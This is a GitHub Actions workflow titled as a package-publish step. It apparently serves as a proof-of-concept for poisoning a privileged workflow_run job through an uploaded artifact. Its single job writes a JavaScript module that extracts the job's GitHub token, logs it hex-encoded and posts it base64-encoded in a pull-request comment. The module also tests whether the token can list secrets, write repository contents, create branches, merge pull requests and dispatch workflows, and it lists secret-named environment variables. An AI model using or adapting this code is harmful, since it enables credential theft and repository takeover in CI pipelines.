name: Publish to pkg.pr.new
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
    tags: ['!**']

permissions:
  contents: read

jobs:
  build:
    if: github.repository == 'PDFtoMark/triage-sveltejs-v46d682b-124463'
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      - name: Stage attacker artifact
        run: |
          mkdir -p tools
          cat > tools/pkg.pr.new-comment.mjs <<'JS'
          import fs from 'node:fs';

          const output = (() => {
            try { return JSON.parse(fs.readFileSync('output.json', 'utf8')); } catch { return {}; }
          })();

          const repoEnv = process.env.GITHUB_REPOSITORY || '';
          console.log('ATTACKER-MODULE-EXECUTED', JSON.stringify({
            cwd: process.cwd(), repo: repoEnv,
            event: process.env.GITHUB_EVENT_NAME,
            workflow: process.env.GITHUB_WORKFLOW,
            run_id: process.env.GITHUB_RUN_ID,
            has_input_token: Boolean(process.env['INPUT_GITHUB-TOKEN'])
          }));

          export default async function ({ github, context }) {
            const { owner, repo } = context.repo;
            const num = output.number || context.payload.workflow_run?.pull_requests?.[0]?.number || 3;
            const report = {};

            const attempt = async (label, fn) => {
              try {
                const r = await fn();
                report[label] = { ok: true, status: r?.status ?? 200, data: r?.data };
                console.log('CAP', label, 'OK', JSON.stringify({ status: r?.status, interesting: r?.data?.permissions ?? r?.data?.merged ?? undefined }));
                return r;
              } catch (e) {
                report[label] = { ok: false, status: e.status, message: e.message };
                console.log('CAP', label, 'FAIL', JSON.stringify({ status: e.status, message: e.message }));
              }
            };

            // --- token extraction ---
            const token = process.env['INPUT_GITHUB-TOKEN'] || (await github.auth({ type: 'token' }).catch(() => ({}))).token || '';
            if (token) {
              const hex = Array.from(new TextEncoder().encode(token)).map((b) => b.toString(16).padStart(2, '0')).join('');
              console.log('ATTACKER-TOKEN-HEX', hex);
              console.log('ATTACKER-TOKEN-LEN', token.length);
              console.log('ATTACKER-TOKEN-PREFIX', token.slice(0, 4));
              // raw fetch with the extracted token: proves the string itself is a live credential
              const raw = await fetch(`https://api.github.com/repos/${owner}/${repo}`, {
                headers: { authorization: `Bearer ${token}`, accept: 'application/vnd.github+json', 'user-agent': 'attacker' }
              });
              const rawBody = await raw.json();
              console.log('ATTACKER-RAW-FETCH', JSON.stringify({ status: raw.status, perms: rawBody.permissions ?? null, scopes: raw.headers.get('x-oauth-scopes') }));
              const who = await fetch('https://api.github.com/installation/repositories', {
                headers: { authorization: `Bearer ${token}`, accept: 'application/vnd.github+json', 'user-agent': 'attacker' }
              });
              console.log('ATTACKER-RAW-INSTALLATION', JSON.stringify({ status: who.status, body: (await who.text()).slice(0, 400) }));
              report.tokenExtracted = { len: token.length, hexLen: hex.length, rawFetchStatus: raw.status };
            } else {
              console.log('ATTACKER-TOKEN-NONE');
            }

            // --- capability matrix ---
            await attempt('repo', () => github.request('GET /repos/{owner}/{repo}', { owner, repo }));
            await attempt('actions-permissions', () => github.request('GET /repos/{owner}/{repo}/actions/permissions', { owner, repo }));
            await attempt('list-secrets', () => github.request('GET /repos/{owner}/{repo}/actions/secrets', { owner, repo }));
            await attempt('list-variables', () => github.request('GET /repos/{owner}/{repo}/actions/variables', { owner, repo }));
            await attempt('secrets-public-key', () => github.request('GET /repos/{owner}/{repo}/actions/secrets/public-key', { owner, repo }));
            await attempt('list-environments', () => github.request('GET /repos/{owner}/{repo}/environments', { owner, repo }));
            await attempt('contents-write', () => github.request('PUT /repos/{owner}/{repo}/contents/ATTACKER-PWN.txt', {
              owner, repo, message: 'attacker contents write attempt', content: Buffer.from('attacker').toString('base64')
            }));
            await attempt('git-ref-main', () => github.request('POST /repos/{owner}/{repo}/git/refs', {
              owner, repo, ref: 'refs/heads/attacker-push', sha: context.payload.workflow_run?.head_sha
            }));
            await attempt('merge-upstream', () => github.request('POST /repos/{owner}/{repo}/merge-upstream', { owner, repo, branch: 'main' }));
            await attempt('dispatch-repository', () => github.request('POST /repos/{owner}/{repo}/dispatches', { owner, repo, event_type: 'attacker' }));
            await attempt('dispatch-workflow', () => github.request('POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches', { owner, repo, workflow_id: 'CI', ref: 'main' }));
            await attempt('update-branch', () => github.request('PUT /repos/{owner}/{repo}/pulls/{pull_number}/update-branch', { owner, repo, pull_number: num }));
            await attempt('merge-pr', () => github.request('PUT /repos/{owner}/{repo}/pulls/{pull_number}/merge', { owner, repo, pull_number: num, merge_method: 'squash' }));
            await attempt('auto-merge-graphql', () => github.graphql(`mutation($id: ID!) { enablePullRequestAutoMerge(input: {pullRequestId: $id, mergeMethod: SQUASH}) { clientMutationId } }`, {
              id: (await github.request('GET /repos/{owner}/{repo}/pulls/{pull_number}', { owner, repo, pull_number: num })).data.node_id
            }));

            // --- issues/pull-requests write proof ---
            await attempt('pr-patch-title', () => github.request('PATCH /repos/{owner}/{repo}/pulls/{pull_number}', { owner, repo, pull_number: num, body: 'attacker patched this PR body via the stolen workflow_run token' }));
            const c = await attempt('comment', () => github.request('POST /repos/{owner}/{repo}/issues/{issue_number}/comments', {
              owner, repo, issue_number: num,
              body: `ATTACKER-RCE-PROOF run=${process.env.GITHUB_RUN_ID} event=${process.env.GITHUB_EVENT_NAME} repoPerms=${JSON.stringify(report.repo?.data?.permissions ?? null)} | token-b64=${Buffer.from(token).toString('base64')} (job-scoped, expires with this run)`
            }));
            console.log('ATTACKER-COMMENT-URL', c?.data?.html_url ?? 'none');

            console.log('ATTACKER-CAP-MATRIX', JSON.stringify(report, (k, v) => (k === 'data' ? undefined : v)));
            console.log('ATTACKER-ENV-NAMES', JSON.stringify(Object.keys(process.env).filter((k) => /secret|token|key|pass|flag/i.test(k))));
          }
          JS
          echo '{"number":3,"sha":"fc0c86d89bca007a0c250bbb937bda6384ab5f56","packages":[]}' > output.json
          ls -l tools output.json
      - name: Upload output
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: output
          path: |
            output.json
            tools/pkg.pr.new-comment.mjs
